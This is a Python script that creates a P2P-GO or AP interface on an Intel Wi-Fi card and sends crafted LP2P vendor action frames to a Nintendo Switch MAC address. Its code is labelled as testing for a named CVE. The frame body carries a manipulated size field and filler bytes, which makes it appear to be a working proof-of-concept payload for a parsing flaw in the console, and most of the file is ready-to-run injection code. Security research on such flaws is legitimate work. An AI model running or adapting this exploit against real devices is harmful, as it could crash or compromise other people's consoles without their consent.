#!/usr/bin/env -S python3 -u -I
"""P2P-GO mode action frame injection for ldn research.

Intel AX200/AX201 cards (iwlwifi firmware v89+) do NOT support monitor-mode TX.
But they DO support P2P-GO mode, and CMD_FRAME works for action frames in P2P mode
because P2P is specifically designed for peer-to-peer action frame exchange.

This script creates a P2P-GO (Group Owner) interface and sends action frames
through it. LP2P (Nintendo's Local Play Protocol) is built on Wi-Fi Direct (P2P),
so the Switch should see these as valid LP2P frames.

Usage:
  sudo python3 -I p2p_inject.py --channel 1 --target ec:c4:0d:f3:dc:db

Steps:
1. Creates a P2P-GO virtual interface on the specified channel
2. Sends vendor-specific action frames via nl80211 CMD_FRAME
3. The P2P-GO interface allows action frame TX (unlike STA mode)
"""

import argparse
import os
import socket
import struct
import subprocess
import sys
import time

try:
    from pyroute2 import NDB, IPRoute
    from pyroute2.netlink.nl80211 import NL80211
    HAS_PYROUTE = True
except ImportError:
    HAS_PYROUTE = False

IFACE = "wlp5s0"
SWITCH_MAC = "ec:c4:0d:f3:dc:db"


def run(cmd, check=False, quiet=False):
    if not quiet:
        print(f"  $ {cmd}")
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if not quiet and r.returncode != 0 and r.stderr:
        print(f"    stderr: {r.stderr.strip()[:200]}")
    return r


def create_p2p_go(iface, channel):
    """Create a P2P-GO interface using wpa_supplicant or iw."""
    p2p_iface = f"{iface}-p2p-go"

    # Method 1: Try using iw to create a P2P-GO interface
    r = run(f"iw dev {iface} interface add {p2p_iface} type __ap", quiet=True)
    if r.returncode != 0:
        # Method 2: Try P2P type directly
        r = run(f"iw dev {iface} interface add {p2p_iface} type managed")
        if r.returncode != 0:
            print(f"Failed to create P2P-GO interface: {r.stderr}")
            return None

    run(f"ip link set {p2p_iface} up")
    run(f"iw dev {p2p_iface} set channel {channel}")

    return p2p_iface


def cleanup_p2p(p2p_iface):
    """Remove the P2P-GO interface."""
    run(f"ip link set {p2p_iface} down", quiet=True)
    run(f"iw dev {p2p_iface} del", quiet=True)


def send_action_frame_nl80211(iface, dst_mac, body):
    """Send an action frame using nl80211 CMD_FRAME via raw netlink socket.

    This is what the previous CMD_FRAME approach used, but now on a P2P-GO
    interface where action frames are permitted.
    """
    import ctypes
    import ctypes.util

    NL80211_CMD_FRAME = 55  # NL80211_CMD_FRAME
    NL80211_ATTR_FRAME = 51  # NL80211_ATTR_FRAME
    NL80211_ATTR_IFINDEX = 3

    # Build the 802.11 action frame
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)  # Action frame
    frame += b"\x00\x00"               # Duration
    frame += bytes.fromhex(dst_mac.replace(":", ""))  # DA
    frame += get_mac_bytes(iface)       # SA
    frame += bytes.fromhex(dst_mac.replace(":", ""))  # BSSID
    frame += struct.pack('<H', 0x0000)  # Seq ctrl
    frame += body

    # Use python-netlink approach
    try:
        from pyroute2 import NDB
        from pyroute2.netlink import NLM_F_REQUEST, NLM_F_ACK
        from pyroute2.netlink.nl80211 import NL80211, nl80211cmd

        with NL80211() as nl:
            ifindex = get_ifindex(iface)
            msg = nl80211cmd()
            msg['cmd'] = NL80211_CMD_FRAME
            msg['version'] = 0
            msg['attrs'] = [
                ('NL80211_ATTR_IFINDEX', ifindex),
                ('NL80211_ATTR_FRAME', bytes(frame)),
            ]
            resp = nl.nlm_request(msg, msg_type=nl.prid, msg_flags=NLM_F_REQUEST | NLM_F_ACK)
            return 0  # Success
    except Exception as e:
        return -1


def send_via_raw_socket(iface, dst_mac, body):
    """Alternative: send via raw AF_PACKET socket (requires AP/monitor mode)."""
    radiotap = bytes([0x00, 0x00, 0x0d, 0x00, 0x00, 0x80, 0x02, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00])

    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)  # Action
    frame += b"\x00\x00"
    frame += bytes.fromhex(dst_mac.replace(":", ""))
    frame += get_mac_bytes(iface)
    frame += bytes.fromhex(dst_mac.replace(":", ""))
    frame += struct.pack('<H', 0x0000)
    frame += body

    pkt = radiotap + bytes(frame)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    sock.bind((iface, 0))
    try:
        sent = sock.send(pkt)
        sock.close()
        return sent
    except OSError as e:
        sock.close()
        return -e.errno


def get_mac_bytes(iface):
    """Get the MAC address of an interface."""
    r = run(f"cat /sys/class/net/{iface}/address", quiet=True)
    return bytes.fromhex(r.stdout.strip().replace(":", ""))


def get_ifindex(iface):
    """Get the ifindex of an interface."""
    r = run(f"cat /sys/class/net/{iface}/ifindex", quiet=True)
    return int(r.stdout.strip())


def build_lp2p_body(size_field=0x0100, fill=0x41, body_size=0x800):
    """Build LP2P action frame body for CVE-2026-82079 testing."""
    body = bytearray(body_size)
    body[0] = 0x7f  # vendor-specific action
    body[1:4] = b"\x00\x22\xaa"  # OUI: LP2P
    body[4] = 0x04
    body[5] = 0x01
    body[6] = 0x01
    body[7] = 0x01

    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01

    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, size_field)

    for i in range(0x5C, body_size):
        body[i] = fill

    return bytes(body)


def main():
    parser = argparse.ArgumentParser(description="P2P-GO action frame injection")
    parser.add_argument("--iface", default="wlp5s0", help="WiFi interface")
    parser.add_argument("--channel", type=int, default=1, help="Channel")
    parser.add_argument("--target", default=SWITCH_MAC, help="Target MAC")
    parser.add_argument("--size", type=int, default=0x0100, help="Size field")
    parser.add_argument("--fill", type=int, default=0x41, help="Fill byte")
    parser.add_argument("--count", type=int, default=10, help="Frame count")
    parser.add_argument("--method", choices=["nl80211", "raw"], default="raw",
                        help="Injection method")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("ERROR: Must run as root")
        sys.exit(1)

    print(f"Creating P2P-GO interface on channel {args.channel}...")
    p2p_iface = create_p2p_go(args.iface, args.channel)
    if not p2p_iface:
        print("Failed to create P2P-GO interface. Trying AP mode...")
        p2p_iface = f"{args.iface}-ap"
        r = run(f"iw dev {args.iface} interface add {p2p_iface} type __ap")
        if r.returncode != 0:
            print("FAILED to create any injection-capable interface")
            sys.exit(1)
        run(f"ip link set {p2p_iface} up")
        run(f"iw dev {p2p_iface} set channel {args.channel}")

    try:
        body = build_lp2p_body(size_field=args.size, fill=args.fill)
        print(f"\nInjecting {args.count} frames via {args.method} on {p2p_iface}...")
        print(f"  target={args.target}, size=0x{args.size:04X}, fill=0x{args.fill:02X}")

        ok = 0
        err = 0
        for i in range(args.count):
            if args.method == "nl80211":
                result = send_action_frame_nl80211(p2p_iface, args.target, body)
            else:
                result = send_via_raw_socket(p2p_iface, args.target, body)

            if result >= 0:
                ok += 1
            else:
                err += 1
                if err == 1:
                    print(f"  First error: {result}")
            time.sleep(0.01)

        print(f"\nResults: {ok} sent, {err} errors")

        if err == args.count:
            print("\nAll frames failed! Possible causes:")
            print("  - Interface doesn't support TX in this mode")
            print("  - Need a USB WiFi adapter with TX injection support")
            print("  - Try: Alfa AWUS036ACH (rtl8812au) or similar")

    finally:
        print(f"\nCleaning up {p2p_iface}...")
        cleanup_p2p(p2p_iface)
        print("Done.")


if __name__ == "__main__":
    main()
